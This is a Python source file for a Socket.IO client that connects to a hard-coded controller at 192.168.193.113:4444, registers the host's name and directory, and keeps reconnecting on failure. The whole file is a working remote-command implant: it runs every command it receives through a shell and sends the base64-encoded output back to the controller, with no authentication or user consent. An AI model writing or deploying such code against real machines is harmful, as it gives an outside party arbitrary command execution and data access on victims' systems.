#!/usr/bin/env python3
"""
client_socketio.py
Run: python3 client_slask.py
This client connects to the Flask-SocketIO server, registers, listens for 'cmd' events,
executes commands (handles cd as builtin) and sends back 'output' events with base64 output.
"""

import socketio
import platform
import base64
import subprocess
import shlex
import os
import time
import uuid

SERVER_URL = "192.168.193.113:4444"   # <-- set controller IP:port
RECONNECT_DELAY = 5

sio = socketio.Client(reconnection=True, reconnection_attempts=0, logger=False, engineio_logger=False)

CLIENT_ID = uuid.uuid4().hex[:8]

def b64(b: bytes) -> str:
    return base64.b64encode(b).decode()

def run_cmd(cmd, timeout=30):
    try:
        completed = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout)
        return completed.stdout
    except Exception as e:
        return str(e).encode()

@sio.event
def connect():
    print("connected to server")
    # Register immediately with ID, hostname, cwd, addr
    hostname = platform.node()
    cwd = os.getcwd()
    # attempt to get local IP for informative UI
    try:
        ip = socketio.client.socket.socket.gethostname()  # fallback
    except Exception:
        ip = ""
    sio.emit('register', {
        "client_id": CLIENT_ID,
        "hostname": hostname,
        "cwd": cwd,
        "addr": ip
    })

@sio.event
def disconnect():
    print("disconnected from server")

@sio.on('cmd')
def on_cmd(data):
    cmd = data.get('cmd','')
    print("received cmd:", cmd)
    # handle cd locally
    parts = []
    try:
        parts = shlex.split(cmd)
    except Exception:
        parts = []
    if parts and parts[0] == "cd":
        target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
        target = os.path.expanduser(target)
        try:
            os.chdir(target)
            out = f"OK cwd: {os.getcwd()}\n".encode()
        except Exception as e:
            out = f"cd failed: {e}\n".encode()
    else:
        out = run_cmd(cmd)
    sio.emit('output', {
        "client_id": CLIENT_ID,
        "hostname": platform.node(),
        "cwd": os.getcwd(),
        "output": b64(out)
    })

def main():
    while True:
        try:
            print("trying to connect to", SERVER_URL)
            sio.connect(SERVER_URL, transports=['websocket'])
            sio.wait()
        except KeyboardInterrupt:
            print("exiting")
            break
        except Exception as e:
            print("connection failed:", e)
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main()
